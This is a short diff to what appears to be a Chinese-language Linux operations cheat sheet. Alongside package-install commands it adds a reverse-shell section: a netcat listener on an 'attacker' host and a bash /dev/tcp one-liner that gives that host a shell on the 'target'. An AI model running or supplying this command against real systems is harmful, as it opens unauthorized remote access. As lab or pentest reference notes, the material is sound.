@@ -156,3 +156,9 @@ sudo yum install net-snmp* -y
 ```bash
 yum -y install lrzsz
 ```
+
+### 6、反弹 shell
+```bash
+攻击机（192.168.0.211）：nc -lk 1234
+靶机（192.168.0.121）：bash -i &> /dev/tcp/192.168.0.211/1234 0>&1
+```
